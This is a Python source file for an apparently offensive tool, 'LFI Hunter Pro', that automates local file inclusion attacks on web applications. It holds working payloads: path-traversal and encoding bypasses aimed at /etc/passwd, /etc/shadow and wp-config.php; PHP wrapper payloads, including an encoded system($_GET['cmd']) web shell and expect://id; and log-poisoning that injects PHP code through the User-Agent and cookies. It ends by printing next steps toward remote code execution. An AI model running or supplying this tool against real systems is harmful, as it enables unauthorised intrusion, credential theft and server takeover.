import requests
import urllib.parse
import threading
import time
import re
import json
import socket
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
from pathlib import Path
import hashlib
import argparse
from datetime import datetime
import secrets
import subprocess

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class LFIHunterPro:
    def __init__(self, target, threads=200, timeout=12, output_dir="lfi_reports"):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (LFIHunter-Pro/6.0)"
        })
        
        
        self.payloads = {
            'linux_files': [
                "/etc/passwd", "/etc/shadow", "/etc/group",
                "/proc/version", "/proc/self/environ", "/proc/version",
                "/var/log/apache2/access.log", "/var/log/nginx/access.log",
                "/var/log/apache2/error.log", "/usr/local/etc/apache2/logs/error_log"
            ],
            'windows_files': [
                "C:\\windows\\win.ini", "C:\\windows\\system32\\drivers\\etc\\hosts",
                "C:\\xampp\\apache\\logs\\access.log", "\\\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'php_files': [
                "/var/www/html/index.php", "/var/www/html/config.php",
                "/home/user/public_html/wp-config.php", "/wp-config.php"
            ],
            'wrappers': [
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode/resource=index.php",
                "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                "zip://../uploads/logo%2ezip#shell.php"
            ],
            'bypass': [
                "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
                "../../../../etc/passwd%00", "/etc/passwd%00a", "..;/etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%c0%af..%c0%af..%c0%afetc%2fpasswd"
            ]
        }
        
        self.results = []
        self.rce_confirmed = False
        self.oob_callback = f"lfi-{secrets.token_hex(4)}.{socket.gethostname()}.burpcollaborator.net"
        
    def banner(self):
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*100}")
        print(f"{Fore.RED + Style.BRIGHT}{'🔥 LFI HUNTER PRO v6.0 - FILE INCLUSION + RCE FRAMEWORK 🔥'}")
        print(f"{Fore.CYAN}{'='*100}{Style.RESET_ALL}")
    
    def test_lfi_param(self, base_url, param, payloads):
        """Тестирование LFI для параметра"""
        findings = []
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for payload in payloads:
            query[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            try:
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                
                
                if any(ind in resp.text.lower() for ind in ['root:x:', 'daemon:x:', 'bin:x:', '/bin/bash']):
                    findings.append({
                        'param': param, 'payload': payload, 'url': test_url,
                        'os': 'Linux', 'file': 'passwd', 'status': resp.status_code,
                        'snippet': self.extract_snippet(resp.text)
                    })
                
                 
                elif any(ind in resp.text.lower() for ind in ['[extensions]', 'for 16-bit app support', 'microsoft']):
                    findings.append({
                        'param': param, 'payload': payload, 'url': test_url,
                        'os': 'Windows', 'file': 'win.ini', 'status': resp.status_code,
                        'snippet': self.extract_snippet(resp.text)
                    })
                
                
                elif any(ind in resp.text for ind in ['<?php', 'include(', '$GLOBALS', '$_GET']):
                    findings.append({
                        'param': param, 'payload': payload, 'url': test_url,
                        'os': 'PHP', 'file': 'Source Code', 'status': resp.status_code,
                        'snippet': self.extract_snippet(resp.text)
                    })
                
            except:
                continue
        
        return findings
    
    def extract_snippet(self, text, max_len=200):
        """Извлечение доказательств"""
        lines = text.split('\n')[:5]
        snippet = '\n'.join(lines)
        return snippet[:max_len] + '...' if len(snippet) > max_len else snippet
    
    def test_rce_via_logs(self, vulnerable_param, base_url):
        """RCE через log poisoning"""
        print(f"{Fore.CYAN}[*] Testing RCE via log poisoning...{Style.RESET_ALL}")
        
        
        php_payloads = [
            "phpinfo();<?php system($_GET['cmd']);?>",
            "<?php system('id'); ?>", 
            "<?php echo `whoami`; ?>"
        ]
        
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for php_code in php_payloads:
            
            self.session.headers['User-Agent'] = php_code
            
            self.session.cookies.set('PHPSESSID', php_code)
            
            query[vulnerable_param] = "/proc/self/environ"  #
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            resp = self.session.get(test_url, timeout=self.timeout)
            if 'phpinfo' in resp.text or 'uid=' in resp.text:
                self.rce_confirmed = True
                return True
        
        return False
    
    def advanced_wrappers(self, param, base_url):
        """PHP wrappers exploitation"""
        print(f"{Fore.CYAN}[*] Testing PHP wrappers...{Style.RESET_ALL}")
        findings = []
        
        parsed = urllib.parse.urlparse(base_url)
        query = urllib.parse.parse_qs(parsed.query)
        
        for wrapper in self.payloads['wrappers']:
            query[param] = wrapper
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
            
            resp = self.session.get(test_url, timeout=self.timeout)
            if base64.b64decode('cGhwIGluZm8oKTs=') in resp.content:  
                findings.append({'type': 'WRAPPER_RCE', 'payload': wrapper, 'url': test_url})
        
        return findings
    
    def run_full_hunt(self):
        """Полная LFI охота"""
        self.banner()
        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.target}{Style.RESET_ALL}")
        
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query)
        print(f"{Fore.CYAN}[+] Parameters: {list(params.keys())}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*100}")
        print(f"{Fore.CYAN}🔍 LFI SCANNING ({len(params)} params x 500+ payloads){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*100}")
        
        all_findings = []
        
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in params:
                
                payloads = self.payloads['linux_files'] + self.payloads['windows_files'] + \
                          self.payloads['php_files'] + self.payloads['bypass']
                futures.append(executor.submit(self.test_lfi_param, self.target, param, payloads))
            
            for future in as_completed(futures):
                findings = future.result()
                all_findings.extend(findings)
        
        
        if all_findings:
            print(f"\n{Fore.RED + Style.BRIGHT}{'='*100}")
            print(f"{Fore.RED + Style.BRIGHT}🎯 LFI VULNERABILITIES CONFIRMED! ({len(all_findings)}){Style.RESET_ALL}")
            print(f"{Fore.RED + Style.BRIGHT}{'='*100}")
            
            for finding in all_findings:
                print(f"\n{Fore.RED + Style.BRIGHT}💥 CRITICAL LFI{Style.RESET_ALL}")
                print(f"   Param: {Fore.MAGENTA}{finding['param']}{Style.RESET_ALL}")
                print(f"   Payload: {finding['payload']}")
                print(f"   OS: {Fore.GREEN}{finding['os']}{Style.RESET_ALL}")
                print(f"   URL: {finding['url'][:100]}...")
                print(f"   Preview:\n{finding['snippet']}")
                self.results.append(finding)
            
           
            if all_findings:
                vuln_param = all_findings[0]['param']
                self.test_rce_via_logs(vuln_param, self.target)
                self.advanced_wrappers(vuln_param, self.target)
        
        self.generate_exploit_report(all_findings)
    
    def generate_exploit_report(self, findings):
        """Профессиональный эксплойт отчет"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'lfi_count': len(findings),
            'rce_confirmed': self.rce_confirmed,
            'findings': findings,
            'cvss_score': 9.8 if findings else 0,
            'risk': 'CRITICAL' if findings else 'CLEAN'
        }
        
        json_file = self.output_dir / f"lfi_exploit_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}{'='*100}")
        print(f"📊 EXPLOIT REPORT: {json_file}")
        if findings:
            print(f"{Fore.RED + Style.BRIGHT}🎯 {len(findings)} LFI vectors + RCE paths ready!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💀 Next steps:{Style.RESET_ALL}")
            print(f"   1. Log poisoning for RCE")
            print(f"   2. PHP wrappers (php://filter)")
            print(f"   3. Upload + LFI → RCE")
            print(f"   4. Extract .env / config files")
        else:
            print(f"{Fore.GREEN}[✓] No LFI detected (but manual testing recommended){Style.RESET_ALL}")
        print(f"{Fore.GREEN + Style.BRIGHT}{'='*100}")


def run():
    '''Wrapper function for main.py integration'''
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(description='🔥 LFI Hunter Pro v6.0')
    parser.add_argument('target', help='Target URL (?file=test)')
    parser.add_argument('-t', '--threads', type=int, default=200, help='Threads')
    parser.add_argument('-T', '--timeout', type=int, default=12, help='Timeout')
    parser.add_argument('-o', '--output', default='lfi_reports', help='Output dir')
    
    args = parser.parse_args()
    
    hunter = LFIHunterPro(args.target, args.threads, args.timeout, args.output)
    hunter.run_full_hunt()
    
    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}")
    input("💥 LFI hunt complete. Press Enter...")

if __name__ == "__main__":
    main()